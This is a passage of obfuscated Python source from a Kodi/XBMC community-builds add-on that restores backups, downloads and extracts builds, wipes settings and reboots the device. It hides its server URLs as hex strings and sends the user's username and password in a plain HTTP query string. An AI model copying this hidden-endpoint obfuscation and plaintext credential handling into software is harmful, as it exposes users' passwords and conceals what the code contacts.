  IiI . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before' , 'installing any community builds.' , 'Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if iIII1I1i1i == 0 :
  oooO0 = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' ) )
  if not os . path . exists ( oooO0 ) :
   os . makedirs ( oooO0 )
  iI = O0O00OOo ( heading = "Enter a name for this backup" )
  if ( not iI ) : return False , 0
  OoOOo = urllib . quote_plus ( iI )
  iii1 = xbmc . translatePath ( os . path . join ( oooO0 , OoOOo + '.zip' ) )
  oOO0oo = [ 'plugin.program.totalinstaller' ]
  II1iIi1IiIii = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
  O0i1i1II1i11 = "Creating full backup of existing build"
  iI111I11i = "Archiving..."
  I1 = ""
  II1i11I1 = "Please Wait"
  OOOO00OO0O0 ( Oo , iii1 , O0i1i1II1i11 , iI111I11i , I1 , II1i11I1 , oOO0oo , II1iIi1IiIii )
 Oo0oiiiiII11iIi = xbmcgui . Dialog ( ) . yesno ( name , 'Would you like to keep your existing database' , 'files or overwrite? Overwriting will wipe any' , 'existing library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if Oo0oiiiiII11iIi == 0 : pass
 elif Oo0oiiiiII11iIi == 1 :
  if os . path . exists ( OooO0 ) :
   shutil . rmtree ( OooO0 )
  try :
   shutil . copytree ( I1i1iiI1 , OooO0 , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
  except :
   i111IIiIII1i = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases.' , 'Continuing may wipe your existing library. Do you' , 'wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if i111IIiIII1i == 1 : pass
   if i111IIiIII1i == 0 : return
  iii1 = xbmc . translatePath ( os . path . join ( oO , 'Database.zip' ) )
  Ii1iI111 ( OooO0 , iii1 )
 if i111IIiIII1i == 0 : return
 time . sleep ( 1 )
 ooOo . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 II1iI11 = os . path . join ( i1iiIIiiI111 , description + '.zip' )
 if not os . path . exists ( i1iiIIiiI111 ) :
  os . makedirs ( i1iiIIiiI111 )
 downloader . download ( url , II1iI11 , ooOo )
 O00oOo0O0o00O = open ( oo00 , mode = 'r' )
 ooo0oo00O00Oo = O00oOo0O0o00O . read ( )
 O00oOo0O0o00O . close ( )
 O00o0O ( II1iI11 )
 ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
 ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
 iIIII1iIIii ( II1iI11 , Oo , ooOo )
 time . sleep ( 1 )
 o0iIiiIiiIi = str ( video )
 if video != '' :
  IIO000oooOO0Oo0 ( o0iIiiIiiIi )
 elif artpack != '' :
  IIO000oooOO0Oo0 ( artpack )
 ooOoO = open ( i1iIIi1 , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 II1Ii1I1i = re . compile ( 'id="(.+?)"' ) . findall ( oOoOOOo )
 OOooOooo0OOo0 = II1Ii1I1i [ 0 ] if ( len ( II1Ii1I1i ) > 0 ) else ''
 oo0o0OoOO0o0 = re . compile ( 'name="(.+?)"' ) . findall ( oOoOOOo )
 III1III11II = oo0o0OoOO0o0 [ 0 ] if ( len ( oo0o0OoOO0o0 ) > 0 ) else ''
 iIi1iI = re . compile ( 'version="(.+?)"' ) . findall ( oOoOOOo )
 o0 = iIi1iI [ 0 ] if ( len ( iIi1iI ) > 0 ) else ''
 OOO000000OOO0 = open ( ii11iIi1I , mode = 'w+' )
 OOO000000OOO0 . write ( 'id="' + str ( OOooOooo0OOo0 ) + '"\nname="' + III1III11II + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + o0 + '"' )
 OOO000000OOO0 . close ( )
 OO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f646f776e6c6f6164636f756e742e7068703f69643d2573'
 o00oOoOo0 = binascii . unhexlify ( OO00 ) % ( OOooOooo0OOo0 )
 II1I ( o00oOoOo0 )
 ooOoO = open ( i1iiIII111ii , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 OO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( oOoOOOo )
 IIiiiiiIiIIi = OO0Oo [ 0 ] if ( len ( OO0Oo ) > 0 ) else ''
 ii1II1II = oOoOOOo . replace ( IIiiiiiIiIIi , o0 )
 OOO000000OOO0 = open ( i1iiIII111ii , mode = 'w' )
 OOO000000OOO0 . write ( str ( ii1II1II ) )
 OOO000000OOO0 . close ( )
 os . remove ( i1iIIi1 )
 if iiiii == 'false' :
  os . remove ( II1iI11 )
 Oooo = open ( oo00 , mode = 'w+' )
 Oooo . write ( ooo0oo00O00Oo )
 Oooo . close ( )
 try :
  os . rename ( o0oOoO00o , i1 )
 except :
  print "NO GUISETTINGS DOWNLOADED"
 time . sleep ( 1 )
 ooOoO = open ( II , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 iiiiI1111 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOoOOOo )
 OO0o0 = iiiiI1111 [ 0 ] if ( len ( iiiiI1111 ) > 0 ) else ''
 OOo0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOoOOOo )
 O00O = OOo0 [ 0 ] if ( len ( OOo0 ) > 0 ) else ''
 Oo0oOOooO0o0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOoOOOo )
 oo0o00oOo0 = Oo0oOOooO0o0O [ 0 ] if ( len ( Oo0oOOooO0o0O ) > 0 ) else ''
 try :
  O0OOo = open ( i1 , mode = 'r' )
  i1I1Iiii1 = file . read ( O0OOo )
  file . close ( O0OOo )
  O0ooooo000 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( i1I1Iiii1 )
  OooOoOO0OO = O0ooooo000 [ 0 ] if ( len ( O0ooooo000 ) > 0 ) else ''
  I1iiIiiii1111 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( i1I1Iiii1 )
  I1ii1i11i = I1iiIiiii1111 [ 0 ] if ( len ( I1iiIiiii1111 ) > 0 ) else ''
  Oooooo0O00o = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( i1I1Iiii1 )
  II11ii1 = Oooooo0O00o [ 0 ] if ( len ( Oooooo0O00o ) > 0 ) else ''
  ii1II1II = oOoOOOo . replace ( OO0o0 , OooOoOO0OO ) . replace ( oo0o00oOo0 , II11ii1 ) . replace ( O00O , I1ii1i11i )
  OOO000000OOO0 = open ( II , mode = 'w+' )
  OOO000000OOO0 . write ( str ( ii1II1II ) )
  OOO000000OOO0 . close ( )
 except :
  print "NO GUISETTINGS DOWNLOADED"
 if os . path . exists ( o0oOoO00o ) :
  os . remove ( o0oOoO00o )
 os . rename ( II , o0oOoO00o )
 try :
  os . remove ( i1 )
 except :
  pass
 if Oo0oiiiiII11iIi == 1 :
  iIIII1iIIii ( iii1 , I1i1iiI1 , ooOo )
  if i111IIiIII1i != 1 :
   shutil . rmtree ( OooO0 )
   if 87 - 87: O0oO . o0oO % Iii1i1I11I * i11iIiiIii
 ooOo . close ( )
 os . makedirs ( ooOoOoo0O )
 time . sleep ( 1 )
 xbmc . executebuiltin ( 'UnloadSkin()' )
 time . sleep ( 1 )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 time . sleep ( 1 )
 xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
 while xbmc . executebuiltin ( "Window.IsActive(appearancesettings)" ) :
  xbmc . sleep ( 500 )
 try : xbmc . executebuiltin ( "LoadProfile(Master user)" )
 except : pass
 IiI . ok ( 'Step 1 complete' , 'Change the skin to: [COLOR=lime]' + skins , '[/COLOR]Once done come back and choose install step 2 which will' , 're-install the guisettings.xml - this file contains all custom skin settings.' )
 xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
 i1OoOO ( guisettingslink )
 if 67 - 67: i1OOO / II11iII . Iii1i1I11I
 if 51 - 51: I1i1iii . OOO00OoOO00 . II11iII % I1i1iii
 if 41 - 41: OoOo - oOOoO0O0O0 + oO00Oo0o000 - o0oO
def iiiiIo00 ( ) :
 iIiI1iI1Ii1 = 0
 i111IIiIII1i = 0
 oOo0OII ( 'totalxbmc.xml' )
 IIIiIi ( )
 i111 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , oO )
 if i111 == '' :
  return
 if os . path . exists ( II ) :
  if os . path . exists ( o0oOoO00o ) :
   os . remove ( II )
  else :
   os . rename ( II , o0oOoO00o )
 if os . path . exists ( i1 ) :
  os . remove ( i1 )
 if not os . path . exists ( i1iIIi1 ) :
  ooOoO = open ( i1iIIi1 , mode = 'w+' )
 if os . path . exists ( ooOoOoo0O ) :
  os . removedirs ( ooOoOoo0O )
 try : os . rename ( o0oOoO00o , II )
 except :
  IiI . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( ooooooo00o , 'We highly recommend backing up your existing build before' , 'installing any builds.' , 'Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if iIII1I1i1i == 0 :
  oooO0 = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' ) )
  if not os . path . exists ( oooO0 ) :
   os . makedirs ( oooO0 )
  iI = O0O00OOo ( heading = "Enter a name for this backup" )
  if ( not iI ) : return False , 0
  OoOOo = urllib . quote_plus ( iI )
  iii1 = xbmc . translatePath ( os . path . join ( oooO0 , OoOOo + '.zip' ) )
  oOO0oo = [ 'plugin.program.totalinstaller' ]
  II1iIi1IiIii = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
  O0i1i1II1i11 = "Creating full backup of existing build"
  iI111I11i = "Archiving..."
  I1 = ""
  II1i11I1 = "Please Wait"
  OOOO00OO0O0 ( Oo , iii1 , O0i1i1II1i11 , iI111I11i , I1 , II1i11I1 , oOO0oo , II1iIi1IiIii )
 Oo0oiiiiII11iIi = xbmcgui . Dialog ( ) . yesno ( ooooooo00o , 'Would you like to keep your existing database' , 'files or overwrite? Overwriting will wipe any' , 'existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if Oo0oiiiiII11iIi == 0 : pass
 elif Oo0oiiiiII11iIi == 1 :
  if os . path . exists ( OooO0 ) :
   shutil . rmtree ( OooO0 )
  try :
   shutil . copytree ( I1i1iiI1 , OooO0 , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
  except :
   i111IIiIII1i = xbmcgui . Dialog ( ) . yesno ( ooooooo00o , 'There was an error trying to backup some databases.' , 'Continuing may wipe your existing library. Do you' , 'wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if i111IIiIII1i == 1 : pass
   if i111IIiIII1i == 0 : iIiI1iI1Ii1 = 1 ; return
  iii1 = xbmc . translatePath ( os . path . join ( oO , 'Database.zip' ) )
  Ii1iI111 ( OooO0 , iii1 )
 if iIiI1iI1Ii1 == 1 :
  return
 else :
  time . sleep ( 1 )
  O00oOo0O0o00O = open ( oo00 , mode = 'r' )
  ooo0oo00O00Oo = O00oOo0O0o00O . read ( )
  O00oOo0O0o00O . close ( )
  O00o0O ( i111 )
  ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
  iIIII1iIIii ( i111 , Oo , ooOo )
  time . sleep ( 1 )
  II1iIIiII11Ii1i1 = ntpath . basename ( i111 )
  OOO000000OOO0 = open ( ii11iIi1I , mode = 'w+' )
  OOO000000OOO0 . write ( 'id="none"\nname="' + II1iIIiII11Ii1i1 + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="none"' )
  OOO000000OOO0 . close ( )
  Oooo = open ( oo00 , mode = 'w+' )
  Oooo . write ( ooo0oo00O00Oo )
  Oooo . close ( )
  try :
   os . rename ( o0oOoO00o , i1 )
  except :
   print "NO GUISETTINGS DOWNLOADED"
  time . sleep ( 1 )
  ooOoO = open ( II , mode = 'r' )
  oOoOOOo = file . read ( ooOoO )
  file . close ( ooOoO )
  iiiiI1111 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oOoOOOo )
  OO0o0 = iiiiI1111 [ 0 ] if ( len ( iiiiI1111 ) > 0 ) else ''
  OOo0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oOoOOOo )
  O00O = OOo0 [ 0 ] if ( len ( OOo0 ) > 0 ) else ''
  Oo0oOOooO0o0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oOoOOOo )
  oo0o00oOo0 = Oo0oOOooO0o0O [ 0 ] if ( len ( Oo0oOOooO0o0O ) > 0 ) else ''
  try :
   O0OOo = open ( i1 , mode = 'r' )
   i1I1Iiii1 = file . read ( O0OOo )
   file . close ( O0OOo )
   O0ooooo000 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( i1I1Iiii1 )
   OooOoOO0OO = O0ooooo000 [ 0 ] if ( len ( O0ooooo000 ) > 0 ) else ''
   I1iiIiiii1111 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( i1I1Iiii1 )
   I1ii1i11i = I1iiIiiii1111 [ 0 ] if ( len ( I1iiIiiii1111 ) > 0 ) else ''
   Oooooo0O00o = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( i1I1Iiii1 )
   II11ii1 = Oooooo0O00o [ 0 ] if ( len ( Oooooo0O00o ) > 0 ) else ''
   ii1II1II = oOoOOOo . replace ( OO0o0 , OooOoOO0OO ) . replace ( oo0o00oOo0 , II11ii1 ) . replace ( O00O , I1ii1i11i )
   OOO000000OOO0 = open ( II , mode = 'w+' )
   OOO000000OOO0 . write ( str ( ii1II1II ) )
   OOO000000OOO0 . close ( )
  except :
   print "NO GUISETTINGS DOWNLOADED"
  if os . path . exists ( o0oOoO00o ) :
   os . remove ( o0oOoO00o )
  os . rename ( II , o0oOoO00o )
  try :
   os . remove ( i1 )
  except :
   pass
  if Oo0oiiiiII11iIi == 1 :
   iIIII1iIIii ( iii1 , I1i1iiI1 , ooOo )
   if i111IIiIII1i != 1 :
    shutil . rmtree ( OooO0 )
  os . makedirs ( ooOoOoo0O )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UnloadSkin()' )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'ReloadSkin()' )
  time . sleep ( 1 )
  xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
  while xbmc . executebuiltin ( "Window.IsActive(appearancesettings)" ) :
   xbmc . sleep ( 500 )
  try : xbmc . executebuiltin ( "LoadProfile(Master user)" )
  except : pass
  IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'Step 1 complete. Now please change the skin to' , 'the one this build was designed for. Once done come back' , 'to this addon and restore the guisettings_fix.zip' )
  xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
  if 24 - 24: Iii1i1I11I . O0oO
  if 15 - 15: OoOo
def IIiii11ii1II1 ( ) :
 import time
 IIIiIi ( )
 ii11I = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , oO )
 if ii11I == '' :
  return
 else :
  I11I1IIiiII1 = 1
  ooooo0Oo0 ( ii11I , I11I1IIiiII1 )
  if 97 - 97: o0oO + ooOO0o . oO00Oo0o000 - ooOO0o
  if 53 - 53: O0OOO . iiIi
def o0oOOoO000 ( url , name ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re' , 'encountering any issues with your device. This will' , 'wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if iIII1I1i1i == 0 :
  return
 elif iIII1I1i1i == 1 :
  Oo00o00Oo = '/storage/.restore/'
  Iii = os . path . join ( Oo00o00Oo , '20141128094249.tar' )
  if not os . path . exists ( Oo00o00Oo ) :
   try : os . makedirs ( Oo00o00Oo )
   except : pass
  downloader . download ( url , Iii )
  time . sleep ( 2 )
  OO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f646f776e6c6f6164636f756e742e7068703f69643d2573'
  o00oOoOo0 = binascii . unhexlify ( OO00 ) % ( name )
  try :
   II1I ( o00oOoOo0 )
  except : pass
  IiI . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot,' , 'if it hasn\'t rebooted within 30 seconds please pull the power' , 'to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
  xbmc . executebuiltin ( 'Reboot' )
  if 50 - 50: oO00Oo0o000 % iiiIi1i1I
  if 75 - 75: OOO00OoOO00 * oO00Oo0o000
def OO0Oo00OO0oo ( ) :
 if Oo0O == 'true' :
  OOOO ( )
 Ii ( '' , '[COLOR=lime]RESTORE LOCAL BUILD[/COLOR]' , 'url' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 Ii ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 if 53 - 53: II11iII - oO00Oo0o000 + OoO0O00
 if os . path . exists ( os . path . join ( oO , 'addons.zip' ) ) :
  Ii ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addons' )
  if 29 - 29: oOOoO0O0O0 + Iii1i1I11I + OOO00OoOO00 * iiIi - OoO0O00 / i11iIiiIii
 if os . path . exists ( os . path . join ( oO , 'addon_data.zip' ) ) :
  Ii ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addon UserData' )
  if 5 - 5: O0OOO - iiIi
 if os . path . exists ( os . path . join ( oO , 'guisettings.xml' ) ) :
  Ii ( '' , 'Restore Guisettings.xml' , o0oOoO00o , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 44 - 44: I1i1iii . I1i1iii + oOOoO0O0O0 * OoO0O00
 if os . path . exists ( os . path . join ( oO , 'favourites.xml' ) ) :
  Ii ( '' , 'Restore Favourites.xml' , i11 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your favourites.xml' )
  if 16 - 16: I1i1iii
 if os . path . exists ( os . path . join ( oO , 'sources.xml' ) ) :
  Ii ( '' , 'Restore Source.xml' , I11 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your sources.xml' )
  if 100 - 100: O0OOO - o0oO
 if os . path . exists ( os . path . join ( oO , 'advancedsettings.xml' ) ) :
  Ii ( '' , 'Restore Advancedsettings.xml' , Oo0o0000o0o0 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 48 - 48: OOO00OoOO00 % oO00Oo0o000 + O0OOO
 if os . path . exists ( os . path . join ( oO , 'keyboard.xml' ) ) :
  Ii ( '' , 'Restore Advancedsettings.xml' , oo0o0O00 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 27 - 27: Ooo0Oo0 / oOOoO0O0O0
 if os . path . exists ( os . path . join ( oO , 'RssFeeds.xml' ) ) :
  Ii ( '' , 'Restore RssFeeds.xml' , oO0o0o0ooO0oO , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 33 - 33: Iii1i1I11I % Ooo0Oo0 . O0OOO / Ooo0Oo0
  if 63 - 63: O0oO + Ii1iIIIi1ii + iiIi + i1OOO
def oOOoO0O ( url ) :
 IIIiIi ( )
 if 'addons' in url :
  OoOoOoOOo00Ooo0O = xbmc . translatePath ( os . path . join ( oO , 'addons.zip' ) )
  iIii1Oo = o0oO0
  Ii11ii1 = o0oO0
  iii1 = xbmc . translatePath ( os . path . join ( oO , 'addons.zip' ) )
 else :
  OoOoOoOOo00Ooo0O = xbmc . translatePath ( os . path . join ( oO , 'addon_data.zip' ) )
  iIii1Oo = i1i1II
 if 'Backup' in ooooooo00o :
  iIi ( )
  ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Backing Up" , '' , 'Please Wait' )
  i1I111Ii1i11 = zipfile . ZipFile ( OoOoOoOOo00Ooo0O , 'w' , zipfile . ZIP_DEFLATED )
  o0O0O0o = len ( iIii1Oo )
  OOiI11I = [ ]
  ooO000 = [ ]
  for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( iIii1Oo ) :
   for file in i1i1i1I :
    ooO000 . append ( file )
  oOoo000 = len ( ooO000 )
  for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( iIii1Oo ) :
   for file in i1i1i1I :
    OOiI11I . append ( file )
    oOOo000oOoO0 = len ( OOiI11I ) / float ( oOoo000 ) * 100
    ooOo . update ( int ( oOOo000oOoO0 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    OoOo00o0OO = os . path . join ( oOOOO , file )
    if not 'temp' in IiIi1ii111i1 :
     if not 'plugin.program.totalinstaller' in IiIi1ii111i1 :
      import time
      ii1IIIIiI11 = '01/01/1980'
      iI1IIIii = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( OoOo00o0OO ) ) )
      if iI1IIIii > ii1IIIIiI11 :
       i1I111Ii1i11 . write ( OoOo00o0OO , OoOo00o0OO [ o0O0O0o : ] )
  i1I111Ii1i11 . close ( )
  ooOo . close ( )
  IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "You Are Now Backed Up" , '' , '' )
 else :
  ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
  iIIII1iIIii ( OoOoOoOOo00Ooo0O , iIii1Oo , ooOo )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 'Backup' in ooooooo00o :
   iiIiiIi1 ( )
   IiI . ok ( "Community Builds - Install Complete" , 'To ensure the skin settings are set correctly XBMC will now' , 'close. If XBMC doesn\'t close please force close (pull power' , 'or force close in your OS - [COLOR=lime]DO NOT exit via XBMC menu[/COLOR])' )
  else :
   IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "You Are Now Restored" , '' , '' )
   if 1 - 1: Ii1iIIIi1ii % OOO00OoOO00 . Ii1iIIIi1ii
def i1IiiI1 ( url ) :
 O000OOOo = xbmc . translatePath ( OO0o . getAddonInfo ( 'profile' ) )
 O0OO = OO0000 ( O000OOOo , 'speedtestfiles' )
 II1I1iIIiIIii = os . path . join ( O0OO , o00IiI1iiII1i1i ( ) + '.speedtest' )
 Oo00O0o0O = II1IIi ( url , II1I1iIIiIIii )
 os . remove ( II1I1iIIiIIii )
 O0OoOO = ( ( O0O / Oo00O0o0O ) * 8 / ( 1024 * 1024 ) )
 o0o0oO0OOO = ( Oo00OOOOO * 8 / ( 1024 * 1024 ) )
 if O0OoOO < 2 :
  O0Ooo0OOOo0oo = 'Very low quality streams may work'
  I1111i1 = 'Expect buffering, do not try HD'
 elif O0OoOO < 2.5 :
  O0Ooo0OOOo0oo = 'You should be ok for SD content only'
  I1111i1 = 'SD/DVD quality should be ok, do not try HD'
 elif O0OoOO < 5 :
  O0Ooo0OOOo0oo = 'Some HD streams may struggle, SD will be fine'
  I1111i1 = 'Most will be fine, some Blurays may struggle'
 elif O0OoOO < 10 :
  O0Ooo0OOOo0oo = 'All streams including HD should stream fine'
  I1111i1 = 'Most will be fine, some Blurays may struggle'
 else :
  O0Ooo0OOOo0oo = 'All streams including HD should stream fine'
  I1111i1 = 'You can play all files with no problems'
 print "Average Speed: " + str ( O0OoOO )
 print "Max. Speed: " + str ( o0o0oO0OOO )
 IiI = xbmcgui . Dialog ( )
 OOO00O = IiI . ok ( 'Speed Test - Results' ,
 '[COLOR blue]Average Speed:[/COLOR] %.02f Mb/s ' % O0OoOO ,
 '[COLOR blue]Live Streams:[/COLOR] ' + O0Ooo0OOOo0oo ,
 '[COLOR blue]Online Video:[/COLOR] ' + I1111i1 ,
 )
 if 18 - 18: II11iII % OOO00OoOO00 . ooOO0o . OoO0O00 . ooOO0o - i1OOO
 if 33 - 33: oO00Oo0o000 + Iii1i1I11I - II11iII / o0oO / Iii1i1I11I
def OOO0 ( url ) :
 iI = O0O00OOo ( heading = "Search for add-ons" )
 if 21 - 21: iiiIi1i1I * iii11I111 + Iii1i1I11I . i1OOO % OOO00OoOO00
 if ( not iI ) : return False , 0
 if 50 - 50: OoOo - OOO00OoOO00 + Ii1iIIIi1ii - II11iII . iiiIi1i1I
 OoOOo = urllib . quote_plus ( iI )
 url += OoOOo
 oOOO0ooo ( url )
 if 8 - 8: OoO0O00
 if 30 - 30: o0oO
def o00oo0oO00OOo0oO ( url ) :
 iI = O0O00OOo ( heading = "Search for content" )
 if 92 - 92: iiIi . I1i1iii
 if ( not iI ) : return False , 0
 if 34 - 34: iii11I111 . i1OOO % O0oO - O0OOO / i1OOO
 OoOOo = urllib . quote_plus ( iI )
 url += OoOOo
 ooOoooo0 ( url )
 if 91 - 91: i11iIiiIii % i1OOO * OOO00OoOO00 - Ooo0Oo0 . i1OOO
 if 28 - 28: i11iIiiIii
def Oo00oo0 ( url ) :
 O00Oo00OOoO0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f636f6d6d756e6974795f6275696c64732e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( O00Oo00OOoO0 ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1111Ii = re . compile ( 'author="(.+?)"' ) . findall ( ooOOoooooo )
 o00oooO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
 if 99 - 99: II11iII / o0oO . Ooo0Oo0
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 Oo0o = I1ii1111Ii [ 0 ] if ( len ( I1ii1111Ii ) > 0 ) else ''
 IIIIiiIiiI = o00oooO0Oo [ 0 ] if ( len ( o00oooO0Oo ) > 0 ) else ''
 if 23 - 23: OoO0O00 * oO00Oo0o000 - Oo000o . O0OOO % Ii1iIIIi1ii
 IiI . ok ( ooooooo00o , 'Author: ' + Oo0o , 'Latest Version: ' + IIIIiiIiiI , '' )
 return
 if 19 - 19: iiIi
 if 66 - 66: OOO00OoOO00 / OoOo
def iII1I ( ) :
 o00oOOo0Oo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f6c6f67696e2f6c6f67696e5f64657461696c732e7068703f757365723d257326706173733d2573'
 i1iIi = binascii . unhexlify ( o00oOOo0Oo ) % ( OOOo0 , Oooo000o )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 Oooo0o0oO = re . compile ( 'posts="(.+?)"' ) . findall ( ooOOoooooo )
 o0OOoOooO0ooO = re . compile ( 'messages="(.+?)"' ) . findall ( ooOOoooooo )
 IiiiIi = re . compile ( 'unread="(.+?)"' ) . findall ( ooOOoooooo )
 IiI111 = re . compile ( 'email="(.+?)"' ) . findall ( ooOOoooooo )
 OO0OO00ooO0 = o0OOoOooO0ooO [ 0 ] if ( len ( o0OOoOooO0ooO ) > 0 ) else ''
 OOOOOoO00oo00 = IiiiIi [ 0 ] if ( len ( IiiiIi ) > 0 ) else ''
 iIIIII11 = IiI111 [ 0 ] if ( len ( IiI111 ) > 0 ) else ''
 ooooOOO0 = Oooo0o0oO [ 0 ] if ( len ( Oooo0o0oO ) > 0 ) else ''
